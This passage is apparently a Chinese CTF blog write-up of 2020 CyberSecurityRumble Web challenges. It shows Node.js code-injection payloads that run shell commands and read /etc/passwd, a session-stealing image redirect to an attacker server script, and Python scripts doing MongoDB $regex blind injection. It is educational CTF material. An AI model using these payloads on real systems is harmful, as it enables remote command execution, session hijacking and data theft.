href="https://nodejs.org/api/modules.html#modules_require_id"><code>require()</code></a>.</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(function()&#123;Function(&#x27;console.log(require(&quot;fs&quot;).readFileSync(&quot;/etc/passwd&quot;))&#x27;)()&#125;)()</span><br><span class="line"><span class="comment">//ReferenceError: require is not defined</span></span><br></pre></td></tr></table></figure></blockquote><p>这题就没有，而 <code>process.mainModule</code> 属性提供了一种获取 <code>require.main</code> 的替代方式，换言之，我们可以通过 <code>process.mainModule.require(&#39;fs&#39;)</code> 来载入，然后通过 <code>fs.readdirSync(path[, options])</code> 同步返回一个包含“指定目录下所有文件名称”的数组对象。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// test</span></span><br><span class="line">\w/gi);</span><br><span class="line"><span class="keyword">let</span> files = []; </span><br><span class="line"><span class="keyword">const</span> fs = process.mainModule.require(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line">fs.readdirSync(<span class="string">&quot;.&quot;</span>).forEach(<span class="function"><span class="params">file</span> =&gt;</span> files.push(file) ); </span><br><span class="line"><span class="keyword">return</span> files;/</span><br><span class="line">------</span><br><span class="line"><span class="string">&#x27;123&#x27;</span>.match(<span class="regexp">/\w/gi</span>);<span class="keyword">let</span> files = []; <span class="keyword">const</span> fs = process.mainModule.require(<span class="string">&#x27;fs&#x27;</span>);fs.readdirSync(<span class="string">&quot;.&quot;</span>).forEach(<span class="function"><span class="params">file</span> =&gt;</span> files.push(file) );<span class="keyword">return</span> files;<span class="comment">//gi)</span></span><br><span class="line">------</span><br><span class="line">&#123; <span class="string">&quot;result&quot;</span>: [ <span class="string">&quot;.dockerignore&quot;</span>, <span class="string">&quot;api.js&quot;</span>, <span class="string">&quot;csregex&quot;</span>, <span class="string">&quot;dist&quot;</span>, <span class="string">&quot;dockerfile&quot;</span>, <span class="string">&quot;index.js&quot;</span>, <span class="string">&quot;leftover.js&quot;</span>, <span class="string">&quot;node_modules&quot;</span>, <span class="string">&quot;package-lock.json&quot;</span>, <span class="string">&quot;package.json&quot;</span>, <span class="string">&quot;regexer.js&quot;</span>, <span class="string">&quot;requests.log&quot;</span>, <span class="string">&quot;simple-fs.js&quot;</span> ] &#125;</span><br></pre></td></tr></table></figure><p>成功，那么接下来只要读取这些文件，结果在 <code>dockerfile</code> 中：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// test</span></span><br><span class="line">\w/gi);</span><br><span class="line"><span class="keyword">const</span> fs = process.mainModule.require(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> data = fs.readFileSync(<span class="string">&#x27;dockerfile&#x27;</span>, <span class="string">&#x27;utf8&#x27;</span>);</span><br><span class="line"><span class="keyword">return</span> data;/</span><br><span class="line">------</span><br><span class="line"><span class="string">&#x27;123&#x27;</span>.match(<span class="regexp">/\w/gi</span>); <span class="keyword">const</span> fs = process.mainModule.require(<span class="string">&#x27;fs&#x27;</span>); <span class="keyword">const</span> data = fs.readFileSync(<span class="string">&#x27;dockerfile&#x27;</span>, <span class="string">&#x27;utf8&#x27;</span>); <span class="keyword">return</span> data;<span class="comment">//gi)</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/11/08/RDK2VCa1BehjSW9.png" style="zoom:80%"></p><p>当然也可以直接 <code>cat</code> 读取文件：</p><p>先给出拼接后的 JavaScript Code :</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>+<span class="title">constructor</span>.<span class="title">constructor</span>(<span class="params"><span class="string">&quot;return process&quot;</span></span>)(<span class="params"></span>).<span class="title">mainModule</span>.<span class="title">require</span>(<span class="params"><span class="string">&quot;child_process&quot;</span></span>).<span class="title">execSync</span>(<span class="params"><span class="string">&#x27;cat * | grep CSR&#x27;</span></span>)+&#x27; \<span class="title">n</span>&#x27;.<span class="title">match</span>(<span class="params"><span class="regexp">/\w/gi</span></span>)</span><br></pre></td></tr></table></figure><p>同上，只不过是选择先闭合了要匹配的字符串，获得全局上下文后直接导入 <code>child_process</code> 来执行系统命令。</p><p>payload（ exp 学习自 <a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/masahiro331/CVE-2019-10758">CVE-2019-10758 PoC</a>）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;+this.constructor.constructor(&quot;return process&quot;)().mainModule.require(&quot;child_process&quot;).execSync(&#39;cat * | grep CSR&#39;)+&#39; </span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/11/08/Z4QoM6rsiFRHuXv.png" style="zoom:80%"></p><h2 id="imghost"><a href="#imghost" class="headerlink" title="imghost"></a>imghost</h2><p>文件上传。</p><p><img src="https://i.loli.net/2020/11/08/UcCQp2X63lGiHgd.png" style="zoom:80%"></p><p>PHP，dirsearch 扫目录有：</p><p><img src="https://i.loli.net/2020/11/08/6tsAZ8N5zFG1wEL.png" style="zoom:80%"></p><p>得到 file.php 源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">$filename = substr($_SERVER[<span class="string">&quot;DOCUMENT_URI&quot;</span>], <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!file_exists(<span class="string">&quot;/dev/shm/uploads/&quot;</span> . $filename) || strlen($filename) &gt; <span class="number">24</span>) <span class="keyword">die</span>(<span class="string">&quot;&lt;h1&gt;404 File not found&lt;/h1&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">&quot;report&quot;</span>] == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">	<span class="keyword">if</span>(!file_exists(<span class="string">&quot;/dev/shm/reports&quot;</span>)) mkdir(<span class="string">&quot;/dev/shm/reports&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span>(!file_exists(<span class="string">&quot;/dev/shm/reports/&quot;</span> . $filename)) &#123;</span><br><span class="line">		file_put_contents(<span class="string">&quot;/dev/shm/reports/&quot;</span> . $filename, <span class="string">&quot;&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&quot;File has been reported, thanks for your help!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">header(<span class="string">&quot;Content-Security-Policy: script-src &#x27;none&#x27;;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;object border=&quot;2px&quot; data=&quot;/uploads/&#x27;</span> . $filename . <span class="string">&#x27;?lang=en&amp;ref=website&amp;pd=&#x27;</span> . md5(session_id()) . <span class="string">&#x27;&amp;u=&#x27;</span> . uniqid() . <span class="string">&#x27;&amp;client=&#x27;</span> . session_id() . <span class="string">&#x27;&amp;method=direct&amp;t=&#x27;</span> . time() . <span class="string">&#x27;&quot;&gt;&lt;/object&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br/&gt;&lt;a href=&quot;?report=1&quot;&gt;Report abuse&lt;/a&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里需要注意的是 HTTP 头信息的 <code>Content-Security-Policy</code> ，简称 CSP ，通常是用来防 XSS 的，提供了很多限制选项，这里的 <code>script-src</code> 限制外部脚本的加载，选项值是 <code>&#39;none&#39;</code> 禁止加载任何外部资源，所以基本不可能 RCE 。</p><p>结合题名，我们可以尝试去获取管理员的 session id 。</p><p>当我们上传一个图片后，点击，<code>~/i/encrypted_filename.png</code> 会去请求：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~&#x2F;uploads&#x2F;FHYVFZAsWZukicREmqTS.png?lang&#x3D;en&amp;ref&#x3D;website&amp;pd&#x3D;387a36e941f19635f8f898f8e2af0dd2&amp;u&#x3D;5fa8e6669c74b&amp;client&#x3D;hluad03qhmob6onl376hlnad5h&amp;method&#x3D;direct&amp;t&#x3D;1604904550</span><br></pre></td></tr></table></figure><p>用以校验身份，而访问图片成功后，有 Report abuse ，点击 referer 同样是来自 <code>~/i/encrypted_filename.png</code> ，结合源码，File Report 后，会在 <code>/dev/shm/reports/</code> 目录下生成一个对应的文件，可以合理猜测，管理员进行访问时也会有来自 <code>~/i/encrypted_filename.png</code> 的请求用来校验身份。</p><p>综上，我们可以利用上传的图片重定向到我们的服务器用来获取 session id 。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://server.com/exp.php&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>exp.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $d = json_encode($_SERVER);</span><br><span class="line">    $filename = <span class="keyword">__DIR__</span> . <span class="string">&quot;/data.txt&quot;</span>;</span><br><span class="line">    file_put_contents($filename, $d);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后我们可以从本地 data.txt 得到 session id ，替换后再次访问可以从 flag.txt 得到 flag 。</p><p>本地测试了下，data.txt 读取到 <code>$_SERVER</code> 的内容：</p><p><img src="https://i.loli.net/2020/11/09/a5coXiYIzQEv1rJ.png" style="zoom:80%"></p><h1 id="Secure-Secret-Sharing"><a href="#Secure-Secret-Sharing" class="headerlink" title="Secure Secret Sharing"></a>Secure Secret Sharing</h1><p>源码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>)</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123;SHA256&#125; = <span class="built_in">require</span>(<span class="string">&quot;sha2&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line">app.use(bodyParser.urlencoded(&#123;<span class="attr">extended</span>: <span class="literal">false</span>&#125;));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> MongoClient = <span class="built_in">require</span>(<span class="string">&#x27;mongodb&#x27;</span>).MongoClient;</span><br><span class="line"><span class="keyword">const</span> mongo_url = <span class="string">&#x27;mongodb://localmongo&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> db_name = <span class="string">&#x27;secrets&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> db_client = <span class="keyword">new</span> MongoClient(mongo_url);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">db_client.connect(<span class="function"><span class="keyword">function</span>(<span class="params">err</span>) </span>&#123; </span><br><span class="line">    db = db_client.db(db_name);</span><br><span class="line">    collection = db.collection(<span class="string">&quot;secrets&quot;</span>)</span><br><span class="line">    app.listen(<span class="number">8080</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">request, response</span>) </span>&#123;</span><br><span class="line">    response.sendFile(path.join(__dirname + <span class="string">&#x27;/html/index.html&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 插入数据</span></span><br><span class="line">app.post(<span class="string">&#x27;/secret_share&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">request, response</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> sec = request.body.sec;</span><br><span class="line">    <span class="comment">//sha256 散列，十六进制输出</span></span><br><span class="line">    <span class="keyword">let</span> secid = SHA256(sec).toString(<span class="string">&quot;hex&quot;</span>);</span><br><span class="line">    <span class="comment">//无 csr 的情况插入</span></span><br><span class="line">    <span class="keyword">if</span> (sec.toLowerCase().includes(<span class="string">&quot;csr&quot;</span>)) &#123;</span><br><span class="line">        response.redirect(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        collection.insertOne(&#123;<span class="attr">id</span>: secid, <span class="attr">secret</span>: sec&#125;);</span><br><span class="line">        response.redirect(<span class="string">&#x27;/secret_share?secid=&#x27;</span> + secid);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//通过 secid 进行检索</span></span><br><span class="line">app.get(<span class="string">&#x27;/secret_share&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">request, response</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> secid = request.query.secid;</span><br><span class="line">    <span class="keyword">var</span> sec = collection.findOne(&#123;<span class="attr">id</span>: secid&#125;);</span><br><span class="line">    sec.then(<span class="function"><span class="params">sec</span> =&gt;</span> &#123;</span><br><span class="line">        fs.readFile(__dirname +<span class="string">&#x27;/html/secret.html&#x27;</span>, &#123;<span class="attr">encoding</span>: <span class="string">&#x27;utf-8&#x27;</span>&#125;, <span class="function">(<span class="params">err, data</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                response.send(data.replace(<span class="string">&quot;$secret&quot;</span>, sec[<span class="string">&quot;secret&quot;</span>]));</span><br><span class="line">                response.end();</span><br><span class="line">            &#125; <span class="function"><span class="title">catch</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;Error: &quot;</span> + e);</span><br><span class="line">                response.status(<span class="number">404</span>);</span><br><span class="line">                response.send(<span class="string">&quot;id does not exist.&quot;</span>);</span><br><span class="line">                response.end();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);        </span><br><span class="line">    &#125;, <span class="function"><span class="params">error</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(error);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/source&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">request, response</span>) </span>&#123;</span><br><span class="line">    fs.readFile(__filename, &#123;<span class="attr">encoding</span>: <span class="string">&#x27;utf-8&#x27;</span>&#125;, <span class="function">(<span class="params">err, data</span>) =&gt;</span> &#123;</span><br><span class="line">        response.type(<span class="string">&quot;text/plain&quot;</span>);</span><br><span class="line">        response.send(data);</span><br><span class="line">        response.end();</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>ExpressJS MongoDB</p><p>因为国内文章关于 MongoDB 注入的比较少且发布时间早，所以我近期写了一篇文章在博客进行介绍，不了解的朋友可以先去看看：mongodb 注入初识</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> sec = collection.findOne(&#123;<span class="attr">id</span>: secid&#125;);</span><br></pre></td></tr></table></figure><p>由上，注入点可以确定为 secid 。</p><p>用 <code>$ne</code> 进行测试一下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;test</span><br><span class="line">?secid[$ne]&#x3D;0</span><br><span class="line">MySuperSecurePW123</span><br></pre></td></tr></table></figure><p>因为这里是 <code>findOne()</code> 只能返回第一条文档记录，而且最重要的一点，secid 是 sha256 加密过的，哈希值之间的差异非常大，我们不能凭 flag 的格式获取到前几位，所以我们改用 <code>$regex</code> 进行类似盲注的测试：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;test</span><br><span class="line">?secid[$regex]&#x3D;^0</span><br><span class="line">princess</span><br><span class="line">&#x2F;&#x2F;princess -&gt; 04e77bf8f95cb3e1a36a59d1e93857c411930db646b46c218a0352e432023cf2</span><br></pre></td></tr></table></figure><p>这样是可行的，我们可以利用 <code>$regex</code> 位位遍历 0~f ，总能找到一个内容含 CSR 的 secret ，所以我手工测试了下，发现最好的情况是前四位就可以区分不同的哈希（开始有了 <code>id does not exist.</code> 的回显）。</p><p>这里“盲注”不像 SQL 里面可以用二分法，要位位遍历，所以效率非常低。</p><p>用四循环遍历当然太慢了，而且出现连续三位相同的概率几乎为 0 ，我们调换一下顺序，并且用 <code>.</code> 代替一位，这里因为只返回第一条文档，所以我们可以挨个试位置，所幸替换第一位就出了结果：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Outloop</span>(<span class="params">Exception</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&quot;0123456789abcdef&quot;</span>:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">&quot;123456789abcdef0&quot;</span>:</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> <span class="string">&quot;23456789abcdef01&quot;</span>:</span><br><span class="line">                url = <span class="string">&quot;http://chal.cybersecurityrumble.de:37585/secret_share?secid[$regex]=^.&#123;&#125;&#123;&#125;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(i, j, k)</span><br><span class="line">                print(<span class="string">&quot;[i] Still looking for: &quot;</span>+i+j+k)</span><br><span class="line">                response = requests.request(<span class="string">&quot;GET&quot;</span>, url)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;CSR&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                    print(<span class="string">&quot;[+] Flag: CSR&quot;</span>+re.search(<span class="string">r&quot;CSR(.*)&#125;&quot;</span>,response.text)[<span class="number">1</span>]+<span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line">                    <span class="keyword">raise</span> Outloop()</span><br><span class="line"><span class="keyword">except</span> Outloop:</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/11/10/LlIxroiJBM6fkeU.png" style="zoom:80%"></p><p>发 200+ 次请求得到了 flag 。</p><p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/Toboxos/ctf-writeups/blob/main/CyberSecurityRumble2020/Secure%20Secret%20Sharing.md">国外师傅</a>有给出优化版本的，是把哈希值视为了树结构，从根节点开始（设置 0~f 中的任意值），先判断其是否有子节点，如果有，是否有多个，优化规则如下：</p><blockquote><p>如果一个节点只有一个子节点，我们假设它只会产生一个散列，因此我们不会遍历子节点的路径。</p></blockquote><p>也就是假设 payload 为 <code>?secid[$regex]=^73</code> 没有子节点，那么当然我们遍历第三层时，就不会再去遍历 730，731，…，73f 等；而如果 78c 有一个子节点 78c1 ，也认为其只会产生一个散列 78c1 ，如图（图源自国外师傅 wp）：</p><p><img src="https://i.loli.net/2020/11/10/mvXjxQCEotKl1B9.png" style="zoom:67%"></p><p>可以想到，我们上面写的脚本其实是所有节点不管有没有子节点都去遍历了一遍，所以非常耗时间。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env</span></span><br><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> queue</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">URL = <span class="string">&quot;http://chal.cybersecurityrumble.de:37585/secret_share?secid[$regex]=^&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查找 flag 的正则表达式</span></span><br><span class="line">regex = <span class="string">r&quot;--&gt;(.*)&lt;!--&quot;</span></span><br><span class="line"></span><br><span class="line">deadStarts = []</span><br><span class="line"></span><br><span class="line">chars = <span class="string">&quot;0123456789abcdef&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果父节点有多个子节点</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parentHasMoreThanOneChildren</span>(<span class="params"><span class="built_in">hash</span></span>):</span></span><br><span class="line">    l = <span class="built_in">len</span>(<span class="built_in">hash</span>) - <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> l &lt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    url = URL + <span class="built_in">hash</span>[:l] + <span class="string">&#x27;[^&#x27;</span> + <span class="built_in">hash</span>[l] + <span class="string">&#x27;]&#x27;</span></span><br><span class="line">    </span><br><span class="line">    r = req.get( url )</span><br><span class="line">    <span class="keyword">if</span> r.status_code == <span class="number">404</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 是否有子节点</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hasChild</span>(<span class="params"><span class="built_in">hash</span></span>):</span></span><br><span class="line">    url = URL + <span class="built_in">hash</span></span><br><span class="line"></span><br><span class="line">    r = req.get( url )</span><br><span class="line">    <span class="keyword">if</span> r.status_code == <span class="number">404</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取 secret</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSecret</span>(<span class="params"><span class="built_in">hash</span></span>):</span></span><br><span class="line">    url = URL + <span class="built_in">hash</span></span><br><span class="line"></span><br><span class="line">    r = req.get( url )</span><br><span class="line">    <span class="keyword">return</span> re.search(regex, r.text)[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 访问子节点判断是否有 flag</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">visitChild</span>(<span class="params"><span class="built_in">hash</span></span>):</span></span><br><span class="line">    print(<span class="built_in">hash</span>, end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> parentHasMoreThanOneChildren(<span class="built_in">hash</span>):</span><br><span class="line">        secret = getSecret(<span class="built_in">hash</span>)</span><br><span class="line">        print( secret )</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;csr&quot;</span> <span class="keyword">in</span> secret.lower():</span><br><span class="line">            exit()</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    print(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> chars:</span><br><span class="line">        <span class="keyword">if</span> hasChild( <span class="built_in">hash</span> + c ):</span><br><span class="line">            visitChild( <span class="built_in">hash</span> +c )</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里设置的根节点为 6</span></span><br><span class="line">visitChild( <span class="string">&#x27;6&#x27;</span> )</span><br></pre></td></tr></table></figure><p>实际上确实是很快。</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>这次比赛打完复盘收获不少，相比于一些比赛总是模改题还是非常不错的，也感觉到自己开发经验欠缺，比如 node 只在原型链污染有接触过一点点，但却没有深入，还是要继续努力。</p></div><div class="popular-posts-header">推荐文章</div><ul class="popular-posts"><li class="popular-posts-item"><div class="popular-posts-title"><a href="\archives\5856e475.html" rel="bookmark">2020 SquareCTF Web 复现记录</a></div></li><li class="popular-posts-item"><div class="popular-posts-title"><a href="\archives\e11628b6.html" rel="bookmark">PHP利用Math函数RCE总结</a></div></li><li class="popular-posts-item"><div class="popular-posts-title"><a href="\archives\ebbdc35f.html" rel="bookmark">每周审计之BlueCMS v1.6 sp1复现</a></div></li><li class="popular-posts-item"><div class="popular-posts-title"><a href="\archives\d8b7f817.html" rel="bookmark">CTF中的SQLite合集</a></div></li></ul><div><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者： </strong>landvsec</li><li class="post-copyright-link"><strong>本文链接：</strong> <a href="https://landvsec.top/archives/672c7ef3.html" title="2020 CSR CTF Web 部分复盘">https://landvsec.top/archives/672c7ef3.html</a></li><li class="post-copyright-license"><strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a 